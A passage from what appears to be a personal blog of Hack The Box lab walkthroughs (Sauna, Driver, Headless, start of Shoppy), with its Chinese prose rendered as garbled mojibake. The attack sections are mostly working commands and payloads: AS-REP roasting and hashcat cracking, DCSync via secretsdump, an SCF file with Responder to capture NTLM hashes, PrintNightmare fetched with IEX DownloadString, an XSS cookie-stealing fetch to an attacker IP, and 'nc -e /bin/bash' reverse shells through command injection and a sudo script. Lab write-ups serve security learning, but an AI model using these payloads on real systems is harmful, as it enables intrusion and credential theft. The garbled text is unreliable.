<p>ç½®ã€‚å½“ä¸å¼ºåˆ¶æ‰§â¾é¢„è®¤è¯æ—¶ï¼Œå¯ä»¥ç›´æ¥å‘é€è™šæ‹Ÿè®¤è¯è¯·æ±‚ã€‚åŸŸæ§åˆ¶å™¨çš„å¯†é’¥åˆ†å‘ä¸­â¼¼ï¼Œï¼ˆKDCï¼‰å°†æ£€æŸ¥â¾ä»½éªŒè¯æœåŠ¡è¯·æ±‚ï¼ˆAS-REQï¼‰ï¼ŒéªŒè¯â½¤â¼¾ä¿¡æ¯å¹¶è¿”å›åŠ å¯†çš„ç¥¨è¯æˆäºˆç¥¨è¯ï¼ˆTGTï¼‰ã€‚ TGT åŒ…å«ä½¿â½¤ç›¸åº”å¸â¼¾çš„ NTLM å“ˆå¸ŒåŠ å¯†çš„ææ–™ï¼ˆæ—¶é—´æˆ³ï¼‰ã€‚å¯ä»¥ä»ä¸­æ´¾â½£å‡ºå“ˆå¸Œå€¼ï¼Œè¯¥å“ˆå¸Œå€¼å¯ä»¥å—åˆ°ç¦»çº¿æš´â¼’æ”»å‡»ä»¥æ³„éœ²æ˜â½‚å¯†ç ã€‚</p>
</blockquote>
<p>è¿™é‡Œç”¨åˆ°impacketçš„è„šæœ¬GetNPUsers.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/kali/impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile unames.txt  -outputfile hashes.asreproast -dc-ip 10.10.10.175</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409191257.png" ></p>
<p>æˆåŠŸæ‹¿åˆ°ä¸€ä¸²hashï¼Œç”¨hashcatçˆ†ç ´ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt -o pass.txt /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°å¯†ç </p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409191433.png" ></p>
<p>æ‹¿è´¦å·å¯†ç ç”¨Evil-WinRMç™»é™†ï¼Œæ‹¿åˆ°ç¬¬ä¸€ä¸ªflag</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409191657.png" ></p>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>ä¸Šä¼ ä¸€ä¸ªwinPEASany.exeï¼Œè¿è¡Œçœ‹çœ‹æœ‰ä»€ä¹ˆå¯ä»¥æå–çš„</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2019.22.45.png" ></p>
<p>å‘ç°ä¸€ä¸²å¯†ç å’Œä¸€ä¸ªæ–°çš„ç”¨æˆ·svc_loanmgrï¼Œæ‹¿ç€è¿™ä¸ªå†æ¬¡ç™»é™†</p>
<p>ç”¨â€œnet users svc_loanmgrâ€æŸ¥çœ‹ç”¨æˆ·è¯¦ç»†ä¿¡æ¯ï¼Œå‘ç°æ˜¯ä¸ªRemote Management Usersç»„</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2019.47.54.png"   style="zoom:50%;" >

<p>å†çœ‹çœ‹è¿™ä¸ªç»„çš„æƒ…å†µï¼Œnet localgroup â€œRemote Management Usersâ€</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409195851.png" ></p>
<p>â€œ Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.â€</p>
<p>è¯¥ç»„æˆå‘˜å…·æœ‰è¿œç¨‹ç®¡ç†ç³»ç»Ÿçš„èƒ½åŠ›ï¼Œæƒé™è¾¾åˆ°ç®¡ç†ï¼Œæ‰€ä»¥å­˜åœ¨DCSync æ”»å‡»</p>
<blockquote>
<p>åœ¨åŸŸç¯å¢ƒä¸­ï¼Œä¸åŒåŸŸæ§åˆ¶å™¨ï¼ˆDCï¼‰ä¹‹é—´ï¼Œæ¯ 15 åˆ†é’Ÿéƒ½ä¼šæœ‰ä¸€æ¬¡åŸŸæ•°æ®çš„åŒæ­¥ã€‚å½“ä¸€ä¸ªåŸŸæ§åˆ¶å™¨ï¼ˆDC 1ï¼‰æƒ³ä»å…¶ä»–åŸŸæ§åˆ¶å™¨ï¼ˆDC 2ï¼‰è·å–æ•°æ®æ—¶ï¼ŒDC 1 ä¼šå‘ DC 2 å‘èµ·ä¸€ä¸ª GetNCChanges è¯·æ±‚ï¼Œè¯¥è¯·æ±‚çš„æ•°æ®åŒ…æ‹¬éœ€è¦åŒæ­¥çš„æ•°æ®ã€‚å¦‚æœéœ€è¦åŒæ­¥çš„æ•°æ®æ¯”è¾ƒå¤šï¼Œåˆ™ä¼šé‡å¤ä¸Šè¿°è¿‡ç¨‹ã€‚DCSync å°±æ˜¯åˆ©ç”¨çš„è¿™ä¸ªåŸç†ï¼Œé€šè¿‡ Directory Replication Serviceï¼ˆDRSï¼‰ æœåŠ¡çš„ GetNCChanges æ¥å£å‘åŸŸæ§å‘èµ·æ•°æ®åŒæ­¥è¯·æ±‚ã€‚</p>
<p>DCSync æ˜¯åŸŸæ¸—é€ä¸­ç»å¸¸ä¼šç”¨åˆ°çš„æŠ€æœ¯ï¼Œå…¶è¢«æ•´åˆåœ¨äº† Mimikatz ä¸­ã€‚åœ¨ DCSync åŠŸèƒ½å‡ºç°ä¹‹å‰ï¼Œè¦æƒ³è·å¾—åŸŸç”¨æˆ·çš„å“ˆå¸Œï¼Œéœ€è¦ç™»å½•åŸŸæ§åˆ¶å™¨ï¼Œåœ¨åŸŸæ§åˆ¶å™¨ä¸Šæ‰§è¡Œä»£ç æ‰èƒ½è·å¾—åŸŸç”¨æˆ·çš„å“ˆå¸Œã€‚</p>
</blockquote>
<p>ä½¿ç”¨secretsdump.pyè„šæœ¬å¤åˆ¶æƒé™ä¸ºæ‰€æœ‰åŸŸâ½¤â¼¾æ˜¾â½° NTLM å“ˆå¸Œå€¼ã€‚è¿â¾ä»¥ä¸‹å‘½ä»¤æ¥è½¬å‚¨ä¸»åŸŸç®¡ç†å‘˜çš„å¯†ç å“ˆå¸Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/kali/impacket/examples/secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administrator</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409200452.png" ></p>
<p>æˆåŠŸæ‹¿åˆ°hashï¼Œç„¶åå†ç™»é™†ï¼ŒæˆåŠŸæ‹¿åˆ°ç®¡ç†å‘˜æƒé™</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409201438.png" ></p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>æ€è·¯ï¼šç½‘é¡µå‘ç°ç”¨æˆ·åâ€“&gt;ç”Ÿæˆå­—å…¸â€“&gt;æŸ¥çœ‹æ˜¯å¦æœ‰ç”¨æˆ·ä¸éœ€è¦Kerberos é¢„â¾ä»½éªŒè¯â€“&gt;æ‹¿åˆ°ç¬¬ä¸€ä¸ªè´¦å·å¯†ç â€“&gt;ææƒå·¥å…·æ‰¾åˆ°è‡ªåŠ¨ç™»å½•çš„è´¦æˆ·å¯†ç â€“&gt;æŸ¥çœ‹åŸŸå†…ä¿¡æ¯â€“&gt;å‘ç°DCSync æ”»å‡»â€“&gt;æŠ“åˆ°ç®¡ç†å‘˜çš„hashâ€“&gt;ææƒæˆåŠŸ</p>
<p>æ–°çš„çŸ¥è¯†ç‚¹ï¼šKerberos é¢„â¾ä»½éªŒè¯ï¼Œè‡ªåŠ¨åŒ–ææƒæ£€æµ‹å·¥å…·ï¼ŒDCSync æ”»å‡»ã€‚ã€‚</p>
<p>æœ¬æ¥æƒ³è¯•ä¸€ä¸‹BloodHoundæŸ¥çœ‹åŸŸå†…ä¿¡æ¯ï¼Œæ€»æ˜¯å¤±è´¥ï¼Œä¸è¿‡çœ‹å®˜æ–¹é¢˜è§£ä¹Ÿèƒ½æ‡‚ï¼Œå¯æƒœå°±è®°å½•ä¸ä¸‹æ¥äº†</p>
]]></content>
      <tags>
        <tag>å¤ç›˜</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>htb driverå¤ç›˜</title>
    <url>/2024/04/10/htb-driver%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>ğŸ“ğŸ“ğŸ“</p>
<h4 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h4><p>å®˜æ–¹wp</p>
<p>ğŸ‘ï¼š<a class="link"   href="https://npfs06.top/2021/11/28/Hacktehbox-Driver/" >https://npfs06.top/2021/11/28/Hacktehbox-Driver/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://m.freebuf.com/articles/web/318970.html" >https://m.freebuf.com/articles/web/318970.html<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h4><p>åœ°å€ï¼š<a class="link"   href="https://app.hackthebox.com/machines/Driver" >https://app.hackthebox.com/machines/Driver<i class="fas fa-external-link-alt"></i></a></p>
<p>éš¾åº¦ï¼šeasy</p>
<p>ipï¼š10.10.11.106</p>
<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap  -p- --min-rate=1000 -T4 -A 10.10.11.106</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410085005.png" ></p>
<p>å¼€çš„ç«¯å£ä¸å°‘ï¼Œæœ‰445ç«¯å£ï¼ˆSMBï¼‰ï¼Œ5985è¯æ˜å¯ä»¥ç”¨evil-winrmç™»é™†</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410085356.png"   style="zoom:30%;" >

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410085439.png" ></p>
<p>æšä¸¾å’Œsmbclientéƒ½æ‰¾ä¸åˆ°æœ‰æ•ˆä¿¡æ¯ï¼Œè€Œä¸”è¿™ä¸ªwindowsç‰ˆæœ¬æ˜¯10ï¼Œç”¨ä¸äº†æ°¸æ’ä¹‹è“ï¼ˆçŸ¥è¯†ç‚¹æ‘„å…¥äº†ï¼ï¼‰</p>
<p>çœ‹åˆ°80ç«¯å£å¼€æ”¾ï¼Œæœ‰ä¸ªç™»é™†å£ï¼ŒçŒœæµ‹æ˜¯å¼±å£ä»¤â€™admin:adminâ€™ï¼ŒæˆåŠŸäº†ï¼Œè¿›å…¥å‘ç°æ˜¯ä¸ªæ‰“å°ç³»ç»Ÿ</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410084730.png"   style="zoom:50%;" >

<p>æ‰«ç›®å½•æ‰«ä¸åˆ°ä»€ä¹ˆä¸œè¥¿ï¼Œä½†æ˜¯å¾ˆå®¹æ˜“æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œç»“åˆå‰é¢å¼€çš„SMBï¼Œå°è¯•<strong>é€šè¿‡NTLMæ•è·è¿›è¡ŒSMBæ”»å‡»</strong></p>
<p><a class="link"   href="https://m.freebuf.com/articles/web/318970.html" >ä½•ä¸ºé€šè¿‡NTLMæ•è·è¿›è¡ŒSMBæ”»å‡»<i class="fas fa-external-link-alt"></i></a> è¿™ç¯‡æ–‡ç« å†™çš„å¾ˆæ¸…æ¥šğŸ‘ï¼Œæ¥ä¸‹æ¥è·Ÿç€åˆ©ç”¨å°±è¡Œ</p>
<p>1.å…ˆå†™ä¸€ä¸ªscfæ–‡ä»¶ï¼ˆ<em>SCFæ–‡ä»¶</em>æ˜¯â€œWINDOWSèµ„æºç®¡ç†å™¨å‘½ä»¤â€æ–‡ä»¶ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ç§å¯æ‰§è¡Œæ–‡ä»¶ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.16.3\tools\nc.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure>

<p>2.ä¸Šä¼ æ¶æ„æ–‡ä»¶è®©ç½‘ç»œä¸­çš„ç”¨æˆ·ï¼ˆå—å®³è€…ï¼‰è¯•å›¾è®¿é—®æˆ‘ä»¬çš„å…±äº«æ–‡ä»¶ï¼Œè¿™æ—¶Responderè¯´ï¼šè¯·æä¾›ç»™æˆ‘NTLMv2å“ˆå¸Œå¹¶è®¿é—®èµ„æºï¼ŒResponderå°±æ”¶åˆ°å—å®³çš„hashäº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">responder -w -I tun0</span><br></pre></td></tr></table></figure>

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410091850.png"   style="zoom:50%;" >

<p>ç„¶åä¸Šä¼ scfæ–‡ä»¶ï¼Œç„¶åå°±æŠ“åˆ°ä¸€ä¸²hash</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410092123.png" ></p>
<p>hashcatçˆ†ç ´ï¼Œçˆ†å‡ºå¯†ç ä¸ºliltony</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 hash --wordlist /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410092222.png" ></p>
<p>æ‹¿ç€è´¦å·å¯†ç ç™»é™†tonyè´¦æˆ·ï¼ŒæˆåŠŸæ‹¿åˆ°ç¬¬ä¸€ä¸ªflag</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410092334.png" ></p>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><h5 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get-process # æŸ¥çœ‹è¿›ç¨‹</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°ä¸€ä¸ªspoolsvï¼Œç½‘ä¸Šèƒ½æ‰¾åˆ°å…¬å¼€æ¼æ´</p>
<p><a class="link"   href="https://github.com/calebstewart/CVE-2021-1675" >https://github.com/calebstewart/CVE-2021-1675<i class="fas fa-external-link-alt"></i></a></p>
<p>ä¸‹è½½pocæ”¾åˆ°ç½‘ç«™ç›®å½•ä¸‹ï¼Œè®©é¶æœºä¸‹è½½</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://10.10.16.3/CVE-2021-1675.ps1&quot;)</span><br></pre></td></tr></table></figure>

<p>æ·»åŠ ä¸€ä¸ªæ–°çš„ç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-Nightmare -DriverName &quot;DRIVER&quot; -NewUser &quot;abc&quot; -NewPassword &quot;abc123&quot;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-10%2009.29.46.png" ></p>
<p>æŸ¥çœ‹ç®¡ç†å‘˜ç»„ï¼Œç¡®è®¤æƒé™æ²¡é—®é¢˜</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410093053.png" ></p>
<p>å†ç”¨evil-winRMç™»é™†ï¼Œè¿™ä¸ªæ—¶å€™å°±æ˜¯ç®¡ç†å‘˜æƒé™äº†ï¼ŒææƒæˆåŠŸ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410093255.png" ></p>
<h5 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h5><p>åœ¨å†å²å‘½ä»¤æ–‡ä»¶ä¸­æ‰¾åˆ°RICOH PCL6 UniversalDriver V4.23æœåŠ¡ï¼Œmsfæœ‰ç›¸å…³pocå¯ä»¥ç”¨</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410100736.png" ></p>
<p>ä½†æ˜¯è·Ÿç€wpä¸€ç›´åˆ©ç”¨å¤±è´¥ï¼Œè¿™é‡Œå°±ç•™ä¸€ä¸ªæœªè§£å†³çš„äº‹é¡¹å§ã€‚ã€‚ã€‚</p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>æ€è·¯ï¼š80ç«¯å£é€šè¿‡å¼±å£ä»¤â€“&gt;æ‰¾åˆ°æ–‡ä»¶ä¸Šä¼ ç‚¹â€“&gt;ç»“åˆSMBæœåŠ¡è¿›è¡Œscfæ”»å‡»æŠ“åˆ°ç”¨æˆ·å¯†ç hashâ€“&gt;å‘ç°å­˜åœ¨å…¬å¼€æ¼æ´çš„æœåŠ¡spoolsv&#x2F;ricohâ€“&gt;låˆ©ç”¨å…¬å¼€pocææƒ</p>
<p>æ¶‰åŠï¼šsmbç«¯å£scfæ”»å‡»ï¼Œå­¦åˆ°äº†ï¼</p>
<p>ä¹Ÿæ˜¯å°è¯•äº†ç”¨msfæ‹¿åˆ°shellï¼Œæ–¹æ³•äºŒææƒå¤±è´¥æœ‰å¾…ç ”ç©¶ï¼Œç›®å‰èŠ±å¤ªå¤šæ—¶é—´åœ¨è¿™ä¸Šé¢ï¼Œä»¥åå†å¥½å¥½ç ”ç©¶å§</p>
]]></content>
      <tags>
        <tag>å¤ç›˜</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>htb headlesså¤ç›˜</title>
    <url>/2024/04/05/htb-headless%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>åˆšå¼€å§‹æ¥è§¦htbï¼Œæ„Ÿè§‰å¾ˆæœ‰æ”¶è·ï¼Œè®°å½•ä¸€ä¸‹</p>
<h4 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h4><p>åœ°å€ï¼š<a class="link"   href="https://app.hackthebox.com/machines/Headless" >https://app.hackthebox.com/machines/Headless<i class="fas fa-external-link-alt"></i></a></p>
<p>éš¾åº¦ï¼šeasy</p>
<p>IPï¼š10.10.11.8</p>
<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><p>æ‰«åˆ°22ç«¯å£å’Œ5000ç«¯å£ï¼Œ5000ç«¯å£æ˜¯upnpæœåŠ¡ï¼Œè¦ç”¨httpåè®®è®¿é—®</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405110933.png" ></p>
<p>èƒ½çœ‹åˆ°ä¸€ä¸ªè¡¨å•ï¼Œæ€è·¯æ˜¯sstiï¼Œsqlæ³¨å…¥ï¼Œxssï¼Œå…ˆå°è¯•ssti</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405111018.png" ></p>
<p>è¢«æ‹¦æˆªäº†ï¼Œè€Œä¸”ä¿¡æ¯è¿˜è¯´ä¼šæŠŠç›¸å…³ä¿¡æ¯å‘ç»™ç®¡ç†å‘˜ï¼Œ<strong>æ€è·¯æ¥äº†ï¼Œè¿™åœ°æ–¹å°±å¯ä»¥è€ƒè™‘xss</strong></p>
<p>æ„é€ ä¸€ä¸ªæ¶æ„xssæ•°æ®åŒ…ï¼ŒåŒæ—¶è¿˜è¦åœ¨æœ¬åœ°ç”¨pythonå¼€å¯ä¸€ä¸ªhttpæœåŠ¡çœ‹è¿”å›çš„æ•°æ®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 5666</span><br></pre></td></tr></table></figure>

<p>å‘åŒ…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /support HTTP/1.1</span><br><span class="line">Host: 10.10.11.8:5000</span><br><span class="line">Content-Length: 59</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://10.10.11.8:5000</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: &lt;img src=15m0 onerror=fetch(&quot;http://10.10.16.19:5666/?cookie=&quot;+document.cookie);&gt;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://10.10.11.8:5000/support</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">fname=1&amp;lname=1&amp;email=1@1.com&amp;phone=1&amp;message=1%0a&#123;&#123;1*1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>User-Agent: &lt;img src&#x3D;15m0 onerror&#x3D;fetch(â€œ<a class="link"   href="http://10.10.16.19:5666/?cookie=%22+document.cookie);%3E" >http://10.10.16.19:5666/?cookie=&quot;+document.cookie);&gt;<i class="fas fa-external-link-alt"></i></a></strong>  é‡ç‚¹æ˜¯è¿™ä¸ª</p>
<p>ç„¶åç­‰å¾…ä¸€ä¸‹ï¼Œå°±å¼¹å›äº†cookie</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405112257.png" ></p>
<p>åŒæ—¶dirsearchæ‰«å‡ºæ¥dashboardç›®å½•</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405112318.png" ></p>
<p>æ‹¿åˆ°äº†cookieåœ¨è®¿é—®dashboardå°±ä¸ä¼š401äº†</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405112541.png" ></p>
<h4 id="Userflag"><a href="#Userflag" class="headerlink" title="Userflag"></a>Userflag</h4><p>æŠ“åŒ…å‘ç°æœ‰postå‘é€äº†äº†ä¸€ä¸ªdateæ•°æ®ï¼Œè¿™é‡Œçš„æ€è·¯æ˜¯å‘½ä»¤æ³¨å…¥ï¼Œæœ‰ç‚¹éš¾æƒ³åˆ°å§</p>
<p>åœ¨dateåé¢åŠ ï¼›ç„¶åå†™å…¥å‘½ä»¤åå¼¹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dashboard HTTP/1.1</span><br><span class="line">Host: 10.10.11.8:5000</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line">Origin: http://10.10.11.8:5000</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://10.10.11.8:5000/dashboard</span><br><span class="line">Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">date=2023-09-15;nc -e /bin/bash 10.10.16.19 1234</span><br></pre></td></tr></table></figure>

<p>ncå¼€å¯ç›‘å¬ï¼ŒæˆåŠŸæ‹¿åˆ°shellï¼Œæ‹¿åˆ°user.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405113521.png" ></p>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>sudo -l æŸ¥åˆ°ä¸€ä¸ªsyscheckï¼Œæ˜¯ä¸ªè„šæœ¬æ–‡ä»¶</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405114121.png" ></p>
<p>ä¸»è¦è°ƒç”¨äº†initdb.shï¼Œé‚£æ€è·¯å°±æ˜¯å¾€é‡Œé¢å†™å‘½ä»¤å°±å¥½äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;nc -e /bin/bash 10.10.16.19 8888&#x27; &gt; initdb.sh</span><br></pre></td></tr></table></figure>

<p>ç„¶åsudo &#x2F;usr&#x2F;bin&#x2F;syscheckï¼Œæœ¬åœ°å¼€å¯ç›‘å¬</p>
<p>æˆåŠŸæ‹¿åˆ°root</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405114946.png" ></p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>è¿™ä¸ªé¶åœºè¿˜æ˜¯æŒºç®€å•çš„ï¼Œæ¯”è¾ƒæœ‰ç‰¹è‰²çš„æ˜¯5000ç«¯å£åˆ¤æ–­xssé‚£é‡Œï¼Œä½“éªŒäº†çœŸå®æ„é€ æ¶æ„ä»£ç æ‹¿åˆ°cookieï¼Œè¿˜æœ‰å‘½ä»¤æ³¨å…¥é‚£é‡Œæ¯”è¾ƒéš¾æƒ³ï¼Œææƒå°±è¿˜å¥½ã€‚</p>
<h5 id="æœ¬æ–‡å‚è€ƒ"><a href="#æœ¬æ–‡å‚è€ƒ" class="headerlink" title="æœ¬æ–‡å‚è€ƒ"></a>æœ¬æ–‡å‚è€ƒ</h5><p><a class="link"   href="https://medium.com/@jamesjarviscyber/headless-htb-writeup-4e704aa8e52c" >https://medium.com/@jamesjarviscyber/headless-htb-writeup-4e704aa8e52c<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/m0_60351808/article/details/137128551" >https://blog.csdn.net/m0_60351808/article/details/137128551<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>å¤ç›˜</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb Shoppyå¤ç›˜</title>
    <url>/2024/09/13/htb-Shoppy%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â””â”€# nmap -A -p- --min-rate=1000 -T4 10.10.11.180</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-12 22:56 PDT</span><br><span class="line">Nmap scan report for shoppy.htb (10.10.11.180)</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)</span><br><span class="line">|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)</span><br><span class="line">|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)</span><br><span class="line">80/tcp   open  http     nginx 1.23.1</span><br><span class="line">|_http-title:             Shoppy Wait Page        </span><br><span class="line">|_http-server-header: nginx/1.23.1</span><br><span class="line">9093/tcp open  copycat?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">ã€‚ã€‚ã€‚ã€‚</span><br><span class="line">OS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R</span><br><span class="line">OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%</span><br><span class="line">OS:RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 53/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   407.75 ms 10.10.16.1</span><br><span class="line">2  